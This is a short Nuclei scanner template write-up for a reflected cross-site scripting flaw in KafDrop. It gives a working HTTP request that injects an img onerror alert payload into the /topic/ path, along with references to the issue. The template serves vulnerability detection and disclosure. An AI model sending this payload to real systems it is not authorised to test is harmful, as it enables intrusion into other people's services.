# Nuclei Template: KafDrop - Cross-Site Scripting
**Template ID:** kafdrop-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`kafdrop-xss.yaml`)

## Vulnerability Information & PoC

## Description
KafDrop contains a cross-site scripting vulnerability. It allows remote unauthenticated attackers to inject arbitrary HTML and/or JavaScript into the response returned by the server.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E
```

## References
- https://github.com/HomeAdvisor/Kafdrop/issues/12
- https://www.blackhatethicalhacking.com/news/apache-kafka-cloud-clusters-expose-sensitive-data-for-large-companies
